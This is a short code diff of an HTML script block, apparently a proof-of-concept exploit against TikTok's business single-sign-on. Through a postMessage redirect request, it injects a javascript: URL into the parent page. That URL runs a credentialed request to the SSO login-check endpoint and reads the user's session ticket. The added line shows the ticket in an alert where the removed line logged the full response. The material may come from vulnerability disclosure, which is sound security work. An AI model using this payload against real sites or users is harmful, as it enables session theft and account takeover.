@@ -1,6 +1,6 @@
 <script>
 parent.postMessage({
     action: "requestRedirectionTo",
-    targetUrlStr: "javascript:var x=new XMLHttpRequest();x.open('GET','https://business-sso.tiktok.com/check_login/',!0);x.withCredentials=!0;x.onload=()=>{console.log(JSON.stringify(JSON.parse(x.responseText)))};x.send()"
+    targetUrlStr: "javascript:var x=new XMLHttpRequest();x.open('GET','https://business-sso.tiktok.com/check_login/',!0);x.withCredentials=!0;x.onload=()=>{var t=JSON.parse(x.responseText).ticket;alert('magic token is = ' + t)};x.send()"
 }, "*");
 </script>
